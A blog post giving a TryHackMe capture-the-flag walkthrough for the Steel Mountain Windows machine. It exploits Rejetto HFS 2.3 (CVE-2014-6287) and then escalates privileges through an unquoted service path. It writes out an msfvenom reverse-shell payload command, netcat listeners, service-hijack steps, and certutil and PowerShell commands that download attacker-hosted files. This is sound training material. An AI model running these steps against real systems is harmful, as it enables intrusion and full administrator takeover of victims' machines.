---
layout: post
title: Tryhackme Steel Mountain CTF Writeup
description: Hack into a Mr. Robot themed Windows machine. Use metasploit for initial access, utilise powershell for Windows privilege escalation enumeration and learn a new technique to get Administrator access. 
date: 2021-12-23 00:50
image: '/assets/img/posts/tryhackme-steel-mountain-ctf-writeup/steelbanner.jpg'
tags: [TryHackme-Machines,ctf,pentesting,remote-code-execution,windows-privesc,powershell,metasploit,unqoted-service-path]
featured: false
---

[**Solve Yourself >>**](https://tryhackme.com/room/steelmountain)


The steel mountain is a windows machine. In order to hack into the machine, we are going to exploit  two different 
vulnerabilities that occur on the system.

# FIRST METHOD
## 1-Preperation
Export the ip address of the machine as a variable for shorthand usage.
<br>-> export ip={MACHINE IP}
<br>![](/assets/img/posts/tryhackme-steel-mountain-ctf-writeup/2.jpg){:.normal}

## 2-Enumeration 
Let us run Network Mapper (**nmap**) to discover opened ports and services.   

| Parameter              | Functionality                                          | 
|:-----------------------|:-------------------------------------------------------|
|-sV                     | Probe open ports to determine service/version info     |
|-sS                     | SYN, half TCP scan                                     |
|-O                      | Enable OS detection                                    |
|-T4                     | T{0-5} Set scan speed, higher is faster                |
|-p-                     | Scan all 65536 ports                                   |
|-Pn                     | Skip host discovery                                    |
|-oN                     | Write output to a file                                 |

Full command: 
{% highlight bash %}
nmap -sV -sS -O -T4 -p- {machine IP} -Pn -oN {outputfile}
{% endhighlight %}
<br>![](/assets/img/posts/tryhackme-steel-mountain-ctf-writeup/3.jpg){:.normal}<br><br>
There is a web server running on port **80**, let us visit.
<br>![](/assets/img/posts/tryhackme-steel-mountain-ctf-writeup/4.jpg){:.normal}<br><br>
There is also one more web server is running at port **8080**
<br>![](/assets/img/posts/tryhackme-steel-mountain-ctf-writeup/5.jpg){:.normal}<br><br>
If you click on the **HttpFileServer2.3** link under the **Server Information** heading, it will redirect you to the following page.
It seems the HTTP server is being run by **rejetto**.
<br>![](/assets/img/posts/tryhackme-steel-mountain-ctf-writeup/6.jpg){:.normal}<br><br>
There is a vulnerablity on the **Rejetto HFS versions 2.3, 2.3a, and 2.3b**, let's check.<br>
[**CVE-Database -> Rejetto HFS 2.3**](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6287)
<br>[**More detailed explaination**](https://www.kb.cert.org/vuls/id/251276)
<br>![](/assets/img/posts/tryhackme-steel-mountain-ctf-writeup/7.jpg){:.normal}<br><br>

## 3-Exploitation

### Gaining Access to the System - Getting User Flag
Launch up your **msfconsole** and do a search for **CVE-2014-6287** to see if there is any exploit that we can use.
There is one with an excellent rank, awesome! Let us use it.
<br>![](/assets/img/posts/tryhackme-steel-mountain-ctf-writeup/8.jpg){:.normal}<br><br>
Copy the THM IP with that command:
{% highlight bash %}
ifconfig | grep -C 1 tun0 | tail -n 1 | awk '{print $2}'
{% endhighlight %}
<br>![](/assets/img/posts/tryhackme-steel-mountain-ctf-writeup/9.jpg){:.normal}<br><br>
-> set RPORT **8080**<br>-> set RHOST **machine IP**<br>-> set LHOST **your THM IP**<br>-> exploit

| Parameter              | Functionality                                          | 
|:-----------------------|:-------------------------------------------------------|
|RPORT                   | The target port (TCP)                                  |
|RHOST                   | Address of the target                                  |
|LPORT                   | The listen port                                        |

![](/assets/img/posts/tryhackme-steel-mountain-ctf-writeup/10.jpg){:.normal}<br><br>
After receiving meterpreter session, run **shell** to get an interactive shell.
<br>![](/assets/img/posts/tryhackme-steel-mountain-ctf-writeup/11.jpg){:.normal}<br><br>
Find the flag under **C:\users\bill\Desktop** directory.
<br>![](/assets/img/posts/tryhackme-steel-mountain-ctf-writeup/12.jpg){:.normal}<br><br>

### Escalate the privileges - Getting the Root flag

After gaining access to the system as a low-level user, it is time to get administrator privileges to have much more 
permissions against the system. **PowerUp.ps1** is a program that facilitates fast checks in a windows machine to identify 
any misconfigurations and privilege escalation possibilities.
<br>-> [**Download PowerUp.ps1**](../../assets/documents/tryhackme-steel-mountain-writeup/PowerUp.ps1)
<br>-> [**PowerSploit GitHub Repo**](https://github.com/PowerShellMafia/PowerSploit)
<br>-> Run **exit** and get back to the **meterpreter** session.
<br>-> Upload the script just as we did before to the machine.
<br>-> Run **load powershell**
<br>-> Run **powershell_shell**
<br>You will get **PowerShell** this time instead of a regular **cmd prompt**.
<br>![](/assets/img/posts/tryhackme-steel-mountain-ctf-writeup/13.jpg){:.normal}<br><br>
<br>-> Run **. .\PowerUp.ps1**
<br>-> Run **Invoke-AllChecks**
<br>**InvokeAllChecks** will diagnose any detectable vulnerabilities along with their descriptions.
<br><br>The first result we got is a service called **AdvancedSystemCare9**, and it has a vulnerability called 
**Unquoted Service Path** [**-> Read more about it**](https://krygennn.github.io/posts/unquoted-service-path-vulnerability/). We will abuse this vulnerability. 
<br>**CanRestart** field means that the current user, in this case, **bill**, can manually restart the service even though
the service itself is being run with **LocalSystem** service account permissions, which has the top-level privileges.
<br>[**LocalSystem Service Account**](https://docs.microsoft.com/en-us/windows/win32/services/localsystem-account?redirectedfrom=MSDN)
<br>![](/assets/img/posts/tryhackme-steel-mountain-ctf-writeup/14.jpg){:.normal}<br><br>

Launch up **msfvenom** to deploy a reverse shell binary. 

| Parameter              | Functionality                                          | 
|:-----------------------|:-------------------------------------------------------|
|LHOST                   | The IP address that the reverse shell will connect     |
|LPORT                   | The port that the reverse shell will connect           |
|-p                      | Payload to use                                         |
|-o                      | Name of the file                                       |
|-f                      | File type of the output binary                         |

Full command:
{% highlight bash %}
msfvenom -p windows/shell_reverse_tcp LHOST={THM IP} LPORT={RANDOM FREE PORT} -f exe -o {somename}.exe
{% endhighlight %}
<br>![](/assets/img/posts/tryhackme-steel-mountain-ctf-writeup/15.jpg){:.normal}<br><br>

-> Upload the binary to the target machine.
<br>-> Get the **shell** again.
<br>![](/assets/img/posts/tryhackme-steel-mountain-ctf-writeup/16.jpg){:.normal}<br><br>

-> Relocate the binary into **C:\Program Files (x86)\IObit** directory.
<br>![](/assets/img/posts/tryhackme-steel-mountain-ctf-writeup/17.jpg){:.normal}<br><br>

-> Rename the binary to **Advanced.exe**.
<br>![](/assets/img/posts/tryhackme-steel-mountain-ctf-writeup/18.jpg){:.normal}<br><br>

Start a **netcat** listener on your machine with the port that is defined when creating
the backdoor.
{% highlight powershell %}
nc -nvlp {SPECIFIED PORT}
{% endhighlight %}
<br>![](/assets/img/posts/tryhackme-steel-mountain-ctf-writeup/nc.jpg){:.normal}<br><br>

After starting a netcat session, restart the service
{% highlight powershell %}
sc stop AdvancedSystemCareService9
{% endhighlight %}
{% highlight powershell %}
sc start AdvancedSystemCareService9
{% endhighlight %}
<br>When the service boots, **Advanced.exe** backdoor binary will be executed instead of the **ASCService.exe**. 
<br>![](/assets/img/posts/tryhackme-steel-mountain-ctf-writeup/19.jpg){:.normal}<br><br>
You can find the root flag **root.txt** under **C:\Users\Administrator\Desktop** directory.

# SECOND METHOD

In this section, instead of using Metasploit and automatizing the process, we will be doing all those steps manually.

## 1-Preperation
<br>-> Copy **Advanced.exe** or create a new backdoor executable with **msfvenom** just like before.
<br>-> Download [**winPEAS.bat**](https://github.com/carlospolop/PEASS-ng/blob/master/winPEAS/winPEASbat/winPEAS.bat)
<br>-> Download static binary [**nc.exe**](https://github.com/andrew-d/static-binaries/blob/0be803093b7d4b627b4d4eddd732e54ac4184b67/binaries/windows/x86/ncat.exe)
<br>-> Download [**PowerUp.ps1**](../../assets/documents/tryhackme-steel-mountain-writeup/PowerUp.ps1) or use the previous one if you downloaded it before.
<br>-> Download [**CVE-2014-6287.py**](../../assets/documents/tryhackme-steel-mountain-writeup/cve20146287.py) or from [**Exploitdb**](https://www.exploit-db.com/exploits/39161)
<br><br>Your directory should look like this
<br>![](/assets/img/posts/tryhackme-steel-mountain-ctf-writeup/20.jpg){:.normal}<br><br>
## 2-Exploitation
Edit the **cve20146287.py** file, set the **ip_addr** field to your THM IP, and set the **local_port** to any free port.
<br>![](/assets/img/posts/tryhackme-steel-mountain-ctf-writeup/25.jpg){:.normal}<br><br>

Start a **netcat** listener on the port you declared in the **python** file.
<br>Run it twice. At first run the server will download **nc.exe** static binary from your server. At second, it will run
**nc.exe** to connect to your local machine by providing a CMD prompt.
<br>![](/assets/img/posts/tryhackme-steel-mountain-ctf-writeup/21.jpg){:.normal}<br><br>

<br>It is possible to use PowerUp.ps1 again or **winPEAS.bat** can be used to enumerate misconfigurations.
<br>You can download any file from the running python server by using one of these utilites.

{% highlight powershell %}
powershell -c "Invoke-WebRequest -URI {YOUR SERVER IP(THM IP)}:80/{THE FILE YOU WANT TO DOWNLOAD} -OutFile {THE PATH WHERE THE FILE WILL BE SAVED}"
{% endhighlight %}

{% highlight powershell %}
certutil.exe -urlcache -split -f http://{YOUR SERVER IP(THM IP)}:80/{THE FILE YOU WANT TO DOWNLOAD}
{% endhighlight %}

<br>![](/assets/img/posts/tryhackme-steel-mountain-ctf-writeup/22.jpg){:.normal}<br><br>
As it can be seen from the output, this time, winPEAS provided the information about the vulnerability on **Advanced System Care9**
service and many others.
<br>![](/assets/img/posts/tryhackme-steel-mountain-ctf-writeup/23.jpg){:.normal}<br><br>
You will need to repeat previous steps to get the root flag. Download **Advanced.exe** with <br>**Invoke-WebRequest** or
**certutil**, start a Netcat listener and restart the service.
<br>
<br>
Thank you for following, wish you more penetrations ;)
